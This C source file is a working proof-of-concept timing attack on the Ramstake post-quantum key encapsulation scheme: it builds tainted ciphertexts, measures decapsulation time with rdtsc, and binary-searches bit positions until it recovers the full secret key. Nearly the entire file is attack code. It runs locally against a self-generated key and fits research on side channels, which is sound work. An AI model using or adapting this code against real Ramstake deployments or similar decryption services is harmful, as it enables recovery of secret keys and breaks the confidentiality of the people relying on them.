// best performance obtained when running while listening to Balthazar

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <gmp.h>
#include <time.h>
#include <stdint.h>
#include <libkeccak.a.headers/SimpleFIPS202.h>

#include "ramstake.h"
#include "csprng.h"
#include "codec_rs.h"


#define distance 1152

uint64_t rdtsc(){
    unsigned int lo,hi;
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

int makeciphertexta( ramstake_ciphertext* c, int pos, mpz_t p, int* onepositions )
{   
    // l is length of perturbation
    int j;
    unsigned char * data;
    codec_rs codec;
    unsigned char * seed;
    int tmp;

    /* generate d */
    mpz_init(c->d);

    // put 1 tainted byte in data
    // these byte positions will detect ones in the ciphertext between pos and pos+distance
    data = malloc(1);
    data[0]=1;
    mpz_import(c->d, 1, -1, 1, 1, 0, data);
    free(data);

    // shift to the right position to detect between pos and pos+distance
    mpz_mul_2exp(c->d, c->d, RAMSTAKE_MODULUS_BITSIZE-(pos%RAMSTAKE_MODULUS_BITSIZE));
    mpz_mod(c->d, c->d, p);
    

    /* generate seed */
    // encode the zero polynomial (any polynomial would be ok)
    seed = malloc(RAMSTAKE_SEED_LENGTH);
    for(j=0;j<RAMSTAKE_SEED_LENGTH;++j)
    {
        seed[j] = 0;
    }
    // generate the hash in c->h
    SHA3_256(c->h, seed, RAMSTAKE_SEED_LENGTH);

    /* generate e */
    // encode the seed
    codec_rs_init(&codec, 256, RAMSTAKE_CODEWORD_LENGTH*8*RAMSTAKE_CODEWORD_NUMBER, RAMSTAKE_CODEWORD_LENGTH*8, RAMSTAKE_CODEWORD_NUMBER);
    data = malloc((codec.n+7)/8);
    codec_rs_encode(data, codec, seed);
    codec_rs_destroy(codec);

    // copy the encoded seed to e
    for(j=0;j<RAMSTAKE_SEEDENC_LENGTH;++j)
    {
        c->e[j] = data[j];
    }

    // taint 111 bytes in the first codeword to reach the error correction boundary
    // taint the full other codewords
    // 66 is a random number
    for(j=RAMSTAKE_CODEWORD_LENGTH-111;j<RAMSTAKE_SEEDENC_LENGTH;++j)
    {
        c->e[j] = 66 ^ c->e[j];
    }

    // compensate for already found ones
    for(j=0; j<RAMSTAKE_MULTIPLICATIVE_MASS+5; j++)
    {
        tmp = onepositions[j];
        if(tmp!=-1)
        {   
            tmp = ( RAMSTAKE_MODULUS_BITSIZE + tmp - pos ) % RAMSTAKE_MODULUS_BITSIZE;
            if(tmp<RAMSTAKE_CODEWORD_LENGTH*8)
            {
                c->e[tmp/8] = c->e[tmp/8]^(1<<(tmp%8));
            }   
        }       
    } 

    free(data);
    free(seed);

    return 0;
}


int testciphertext(int num_trials, int threshold, ramstake_ciphertext c, ramstake_secret_key sk, int kat, int verbose)
{
    // perform a timing of the ciphertext to test whether an error occured
    unsigned char * key2;

    struct timespec clock_decaps_start;
    struct timespec clock_decaps_stop;

    uint64_t cycles_decaps_start;
    uint64_t cycles_decaps_stop;

    float cycles;

    int j;

    // time the execution of the decapsulation
    key2 = malloc(RAMSTAKE_KEY_LENGTH);
    clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &clock_decaps_start); cycles_decaps_start = rdtsc();
    for( j = 0 ; j < num_trials ; ++j )
    {
        ramstake_decaps(key2, c, sk, kat);
    }
    clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &clock_decaps_stop); cycles_decaps_stop = rdtsc();

    cycles = 1.0*(cycles_decaps_stop - cycles_decaps_start)/num_trials;

    if(verbose==1)
    {
        printf("Decaps cycles: %.0f - ", cycles);
    }

    // compare to threshold
    if(cycles < threshold)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}


int main( int argc, char ** argv )
{
    unsigned long randomness;
    csprng rng;
    int i, j;
    int pos;
    int num_trials;
    int trial_success;
    int trial_success_gt;
    int beginpos, endpos;
    int onepositions[RAMSTAKE_MULTIPLICATIVE_MASS+5];
    int verbose=0;

    float cycles_succes, cycles_fail, threshold;

    mpz_t p, tmp, tmp2;

    unsigned char * rng_seed;

    ramstake_public_key pk;
    ramstake_secret_key sk;
    ramstake_ciphertext c;

    unsigned char * sk_seed;
    unsigned char * key2;

    struct timespec clock_decaps_start;
    struct timespec clock_decaps_stop;

    uint64_t cycles_decaps_start;
    uint64_t cycles_decaps_stop;

    if( argc < 2 || strlen(argv[1]) % 2 != 0 )
    {
        printf("usage: ./perform [random seed, eg deadbeef] [optional verbose: -v]\n");
        return 0;
    }
    printf ("This program was called with \"%s\".\n",argv[0]);
    if( argc == 3)
    {
        if(strcmp(argv[2], "-v"))
        {
            verbose=0;
        }
        else
        {
            verbose=1;
        }
    }

    /* grab randomness */
    csprng_init(&rng);

    rng_seed = malloc(strlen(argv[1])/2);
    for( i = 0 ; i < strlen(argv[1])/2 ; ++i )
    {
        sscanf(argv[1] + 2*i, "%2hhx", &rng_seed[i]);
    }
    csprng_seed(&rng, strlen(argv[1])/2, rng_seed);
    free(rng_seed);

    randomness = csprng_generate_ulong(&rng);

    printf("randomness: %lu\n", randomness);

    /* allocate memory */
    sk_seed = malloc(RAMSTAKE_SEED_LENGTH * 2);
    csprng_generate(&rng, RAMSTAKE_SEED_LENGTH * 2, sk_seed);
    key2 = malloc(RAMSTAKE_KEY_LENGTH);

    // set some usefull values
    num_trials = 1;
    mpz_init(p);
    ramstake_modulus_init(p);
    

    for(i=0; i<RAMSTAKE_MULTIPLICATIVE_MASS+5; i++)
    {
        onepositions[i]=-1;
    } 

    /********************/
    /* setup the attack */
    /********************/

    /* generate timing examples */
    ramstake_public_key_init(&pk);
    ramstake_secret_key_init(&sk);

    ramstake_keygen(&sk, &pk, sk_seed + RAMSTAKE_SEED_LENGTH, 0);

    /* first timing: generate decoding success */
    makeciphertexta(&c, 0, p, onepositions);
    mpz_set_ui(c.d, 0);

    clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &clock_decaps_start); cycles_decaps_start = rdtsc();
    for( j = 0 ; j < num_trials ; ++j )
    {
        trial_success = ramstake_decaps(key2, c, sk, 0);
    }
    clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &clock_decaps_stop); cycles_decaps_stop = rdtsc();

    
    cycles_fail = 1.0*(cycles_decaps_stop - cycles_decaps_start)/num_trials;
    printf("decoding success cycles: %f\n", cycles_fail);

    /* first timing: generate decoding failure */
    makeciphertexta(&c, 0, p, onepositions);
    mpz_set_ui(c.d, 1);

    if(ramstake_decaps(key2, c, sk, 0)==-2)
    {
        mpz_add_ui(sk.a, sk.a, 1);
    }


    clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &clock_decaps_start); cycles_decaps_start = rdtsc();
    for( j = 0 ; j < num_trials ; ++j )
    {
        trial_success = ramstake_decaps(key2, c, sk, 0);
    }
    clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &clock_decaps_stop); cycles_decaps_stop = rdtsc();

    cycles_succes = 1.0*(cycles_decaps_stop - cycles_decaps_start)/num_trials;
    printf("decoding failure cycles: %f\n", cycles_succes);

    // set threshold
    threshold = (cycles_fail + cycles_succes)/2;

    /********************/
    /* start the attack */
    /********************/
    ramstake_public_key_init(&pk);
    ramstake_secret_key_init(&sk);

    /* init secret key */
    ramstake_keygen(&sk, &pk, sk_seed, 0);
    pos=2*distance;


    /* keep on looping untill you find the full secret */
    for( ; ; )
    {
        beginpos=1;
        endpos=0;
        pos=(RAMSTAKE_MODULUS_BITSIZE + pos - 2*distance) % RAMSTAKE_MODULUS_BITSIZE;
        for( ; ; pos=(pos+distance)%RAMSTAKE_MODULUS_BITSIZE)
        {
            // make ciphertexts that is correct if there is no 1 between pos and pos+distance in a, and that fails if there is a one
            makeciphertexta(&c, pos, p, onepositions);

            // timing to test if there is a one in pos, pos+distance
            trial_success = testciphertext(num_trials, threshold, c, sk, 0, verbose);

            // if the previous partition contains no 1, and this partition contains a one, go to next step
            if((trial_success==1)&&(beginpos==0))
            {
                beginpos = pos;
                endpos = pos+distance-1;
                // printf("\n");
                // printf("\n");
                break;
            }

            // save the result of previous partition
            beginpos = trial_success;

            /* in depth output of what is happening           */
            /**************************************************/
            if(verbose==1)
            {            
                if(trial_success==1)
                {
                    printf("between %d and %d: 1  - ", pos, pos+distance-1);
                }
                else
                {
                    printf("between %d and %d: 0 - ", pos, pos+distance-1);
                }
                /* ground truth value to check estimations, are only used for terminal output */
                mpz_init(tmp);
                mpz_mul_2exp(tmp, sk.a, RAMSTAKE_MODULUS_BITSIZE-pos);
                mpz_mod(tmp, tmp, p);
                mpz_init(tmp2);
                mpz_set_ui(tmp2, 1);
                mpz_mul_2exp(tmp2, tmp2, distance);
                mpz_mod(tmp, tmp, tmp2);
                trial_success_gt = mpz_cmp_d(tmp, 0);
                mpz_clear(tmp);
                mpz_clear(tmp2);
                if(trial_success_gt > 0)
                {
                    printf("1");
                }
                else
                {
                    printf("0");
                } 
                printf("\n");
            }
        }

        /* go into second phase */
        /* binary search for the exact location of a 1 in the partition detected above*/
        for( ; ; )
        {
            // end if you found the exact location
            if(beginpos==endpos)
            {
                break;
            }

            // split the interval in two and check in which interval the one is
            if(beginpos<endpos)
            {
                pos = (beginpos + endpos+1)/2;
            }
            else
            {
                pos = (beginpos + RAMSTAKE_MODULUS_BITSIZE + endpos+1)/2;
            }
            pos = (pos - distance) % RAMSTAKE_MODULUS_BITSIZE;

            // make the ciphertext and perform the timing attack
            makeciphertexta(&c, pos, p, onepositions);
            trial_success = testciphertext(num_trials, threshold, c, sk, 0, verbose);

            // adapt the partition in which the one is found
            if(trial_success==1)
            {
                endpos=(pos+distance-1)%RAMSTAKE_MODULUS_BITSIZE;
            }
            else
            {
                beginpos=(pos+distance)%RAMSTAKE_MODULUS_BITSIZE;
            }

            /* in depth output of what is happening           */
            /* uncomment lines below if you want extra output */
            /**************************************************/
            if(verbose==1)
            {
                printf("%d - %d\n", beginpos, endpos);
            }
        }

        /* HUUUUURRRAAAAYYYY    */
        /* we have found a one! */
        if(verbose==1)
        {
            printf("\n---------------------\n");
        } 
        printf("one at position: %d - ", beginpos);

        // test ground truth
        // this is just for terminal output, and is not used in the attack
        mpz_init(tmp);
        mpz_mul_2exp(tmp, sk.a, RAMSTAKE_MODULUS_BITSIZE-beginpos);
        mpz_mod(tmp, tmp, p);
        mpz_mod_ui(tmp, tmp, 2);
        mpz_out_str(stdout, 16, tmp);
        mpz_clear(tmp);

        // test if value is already found
        // if value is already found, we made a mistake, correcting if necessary
        for(i=0; i<RAMSTAKE_MULTIPLICATIVE_MASS+5; i++)
        {
            if(onepositions[i]==beginpos)
            {
                onepositions[i]=-1;
                beginpos=-1;
                printf(" <-- was wrong, corrected");
                break;
            }
        }
        // if no mistake was made, add value to the list of onepositions
        if(beginpos!=-1)
        {
            for(i=0; i<RAMSTAKE_MULTIPLICATIVE_MASS+5; i++)
            {
                if(onepositions[i]==-1)
                {
                    onepositions[i]=beginpos;
                    break;
                }
            }
        }

        printf(" (%d/%d)\n",i,RAMSTAKE_MULTIPLICATIVE_MASS);
        if(verbose==1)
        {
            printf("---------------------\n\n");
        } 

        // abort if we found the full secret
        mpz_init(tmp);
        for(i=0; i<RAMSTAKE_MULTIPLICATIVE_MASS+5; i++)
        {
            if(onepositions[i]!=-1)
            {
                mpz_init(tmp2);
                mpz_set_ui(tmp2, 1);
                mpz_mul_2exp(tmp2, tmp2, onepositions[i]);
                mpz_add(tmp, tmp, tmp2);
            }
        }
        if(mpz_cmp(tmp,sk.a)==0)
        {   
            // mpz_out_str(stdout,16,tmp);
            printf("\nfound all positions and recovered the full secret\n");
            break;
        }
    }
    /* free memory */
    free(sk_seed);
    free(key2);
    
    return 0;
}

